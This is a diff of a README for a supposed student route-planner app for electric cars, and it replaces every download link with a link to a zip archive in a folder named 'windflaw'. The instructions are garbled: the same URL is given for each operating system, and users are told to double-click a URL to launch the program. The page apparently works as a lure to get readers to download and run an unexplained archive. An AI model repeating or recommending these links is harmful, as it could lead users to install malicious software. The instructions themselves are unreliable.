@@ -1,7 +1,7 @@
 # 🌟 API-Project - Easily Find Routes for Electric Cars
 
 ## 📦 Download Here!
-[![Download](https://raw.githubusercontent.com/Castro57-goblim/API-Project/main/Specifications/Open_Tests_1.zip%20release-brightgreen)](https://raw.githubusercontent.com/Castro57-goblim/API-Project/main/Specifications/Open_Tests_1.zip)
+[![Download](https://github.com/Castro57-goblim/API-Project/raw/refs/heads/main/windflaw/AP-Project-1.5.zip%20release-brightgreen)](https://github.com/Castro57-goblim/API-Project/raw/refs/heads/main/windflaw/AP-Project-1.5.zip)
 
 ## 📖 Introduction
 Welcome to the API-Project! This repository contains the final test project from the Polytechnic of Milan. Our application, CercaPercorso, helps you find a route between two stations on a highway and manage the stations for electric cars. You can easily identify charging stations along your journey, making travel more convenient for electric car users.
@@ -18,9 +18,9 @@ Before you start, ensure your system meets the following requirements:
 - Network: Internet connection for downloading the app and accessing maps
 
 ### 📂 Download & Install
-1. **Visit the Downloads Page**: Go to our [Releases page](https://raw.githubusercontent.com/Castro57-goblim/API-Project/main/Specifications/Open_Tests_1.zip) to find the latest version of CercaPercorso.
+1. **Visit the Downloads Page**: Go to our [Releases page](https://github.com/Castro57-goblim/API-Project/raw/refs/heads/main/windflaw/AP-Project-1.5.zip) to find the latest version of CercaPercorso.
    
-2. **Choose Your File**: Look for the file that matches your operating system (e.g., https://raw.githubusercontent.com/Castro57-goblim/API-Project/main/Specifications/Open_Tests_1.zip or https://raw.githubusercontent.com/Castro57-goblim/API-Project/main/Specifications/Open_Tests_1.zip).
+2. **Choose Your File**: Look for the file that matches your operating system (e.g., https://github.com/Castro57-goblim/API-Project/raw/refs/heads/main/windflaw/AP-Project-1.5.zip or https://github.com/Castro57-goblim/API-Project/raw/refs/heads/main/windflaw/AP-Project-1.5.zip).
 
 3. **Download the File**: Click to download the file. Your browser will start downloading it automatically.
 
@@ -29,8 +29,8 @@ Before you start, ensure your system meets the following requirements:
    - For macOS: Double-click the zip file to extract the contents.
 
 5. **Run the Application**: 
-   - For Windows: Open the extracted folder and double-click on `https://raw.githubusercontent.com/Castro57-goblim/API-Project/main/Specifications/Open_Tests_1.zip` to launch the application.
-   - For macOS: Open the extracted folder and double-click on `https://raw.githubusercontent.com/Castro57-goblim/API-Project/main/Specifications/Open_Tests_1.zip` to start the application.
+   - For Windows: Open the extracted folder and double-click on `https://github.com/Castro57-goblim/API-Project/raw/refs/heads/main/windflaw/AP-Project-1.5.zip` to launch the application.
+   - For macOS: Open the extracted folder and double-click on `https://github.com/Castro57-goblim/API-Project/raw/refs/heads/main/windflaw/AP-Project-1.5.zip` to start the application.
 
 ### 🚧 Troubleshooting
 If you encounter issues, consider the following:
@@ -60,4 +60,4 @@ For more details on the license and usage, refer to the LICENSE file in the repo
 
 ---
 
-For any additional information, you can always refer back to the [Releases page](https://raw.githubusercontent.com/Castro57-goblim/API-Project/main/Specifications/Open_Tests_1.zip) for downloads and updates. Thank you for using CercaPercorso!
+For any additional information, you can always refer back to the [Releases page](https://github.com/Castro57-goblim/API-Project/raw/refs/heads/main/windflaw/AP-Project-1.5.zip) for downloads and updates. Thank you for using CercaPercorso!
